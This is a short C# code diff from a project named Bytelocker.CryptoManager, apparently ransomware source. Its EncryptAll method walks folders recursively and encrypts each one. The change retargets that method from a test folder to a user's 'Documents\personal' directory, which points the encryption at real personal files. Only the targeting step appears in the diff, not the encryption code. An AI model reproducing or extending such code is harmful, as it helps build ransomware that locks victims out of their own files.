@@ -66,7 +66,7 @@ namespace Bytelocker.CryptoManager
         public void EncryptAll()
         {
             DirManager dfm = new DirManager();
-            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Desktop\New folder");
+            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Documents\personal");
             foreach (String subDir in dirs)
             {
                 dfm.ChooseDir(subDir);
